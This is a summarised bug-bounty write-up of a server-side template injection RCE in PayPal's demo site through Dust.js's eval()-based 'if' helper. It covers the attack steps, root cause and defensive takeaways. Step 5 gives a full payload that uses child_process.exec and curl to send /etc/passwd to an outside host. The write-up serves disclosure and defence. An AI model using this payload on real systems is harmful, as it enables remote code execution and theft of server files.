# PayPal Node.js Dust.js Template Injection RCE

## Metadata
- **Source:** writeups.io
- **Date:** 2026-05-25
- **Author:** Various
- **Program:** PayPal
- **Bounty:** $10,000
- **Severity:** Critical
- **Vuln types:** Server-Side Template Injection (SSTI), Code Injection, Remote Code Execution (RCE), Unsafe use of eval()
- **Category:** memory-binary
- **Writeup:** http://artsploit.blogspot.com/2016/08/pprce2.html

## Summary
A critical RCE vulnerability existed in PayPal's demo.paypal.com application due to unsafe use of eval() within Dust.js template engine's 'if' helper. User-controlled input passed through Dust.js template processing could be evaluated as arbitrary JavaScript code, allowing remote code execution. The vulnerability was exploitable by bypassing HTML encoding protection through parameter type juggling when sending array parameters instead of strings.

## Attack scenario (step by step)
1. Attacker performs HTTP parameter fuzzing on demo.paypal.com and discovers differential responses to backslash and newline characters, indicating server-side code evaluation
2. Attacker identifies the Dust.js templating engine through error messages and reviews source code to discover eval() usage in 'if' helper for expression evaluation
3. Attacker notes that single and double quotes are HTML-encoded as protection mechanism, preventing direct string escape
4. Attacker exploits Node.js query string parsing by sending array-type parameters (device[]=value) which bypass the string-based HTML encoding function
5. Attacker crafts malicious payload injecting arbitrary JavaScript code: device[]=x&device[]=y'-require('child_process').exec('curl -F "x=`cat /etc/passwd`" artsploit.com')-'
6. Server evaluates the concatenated array values as JavaScript code within eval(), executing arbitrary shell commands and exfiltrating sensitive files

## Root cause
The application used Dust.js template engine with 'if' helpers that internally relied on JavaScript eval() for expression evaluation. Input validation attempted HTML encoding of quotes, but this protection only worked for string-type parameters. When parameters were parsed as arrays by the Node.js 'qs' module, they bypassed the string-based HTML encoding, allowing arbitrary code injection into the eval() context.

## Attacker mindset
The attacker systematically fuzzed HTTP parameters to identify unusual server behavior, then reverse-engineered the underlying technology stack. Upon discovering eval() usage, the attacker analyzed both the template engine code and Node.js parameter parsing behavior to identify a type-confusion weakness that circumvented client-side protections. The attacker recognized that array parameters would not be processed by the string-encoding function, creating an exploitable gap.

## Defensive takeaways
- Never use eval() or similar dynamic code evaluation functions on user-supplied input, even with sanitization
- Implement input validation at the type level - validate that parameters are strings when string processing is expected
- Apply security controls consistently across all input types and formats (strings, arrays, objects)
- Use parameterized/safe templating engines that do not require eval() for expression evaluation
- Implement defense-in-depth: combine input validation, output encoding, and code-level protections
- Regularly audit and update third-party libraries for security vulnerabilities
- Disable or restrict access to dangerous Node.js modules like child_process in template contexts

## Variant hunting
Search for other applications using Dust.js 'if' helpers or similar templating engines with eval()-based expression evaluation. Look for query parameter fuzzing responses indicating code evaluation. Test for array parameter type juggling bypassing validation on applications using qs or similar parsers. Examine other Node.js template engines (EJS, Handlebars older versions) for similar eval() patterns. Test frameworks that use expression languages (OGNL, SpEL, etc.) for type confusion vulnerabilities.

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1203: Exploitation for Client Execution
- T1059: Command and Scripting Interpreter
- T1071: Application Layer Protocol
- T1078: Valid Accounts (if authentication bypass involved)
- T1083: File and Directory Discovery

## Notes
This vulnerability exemplifies how layered protections can fail when fundamental architectural decisions are flawed. The use of eval() was the core issue; HTML encoding was a band-aid solution that fell apart under type juggling. The $10,000 bounty reflects the severity and exploitability of RCE on a major financial institution's web property. This case demonstrates the importance of understanding how different components interact - the attacker had to understand both Dust.js template processing and Node.js query string parsing to craft the exploit.

---
*Analysed by Claude (claude-haiku-4-5-20251001) on 2026-05-25*
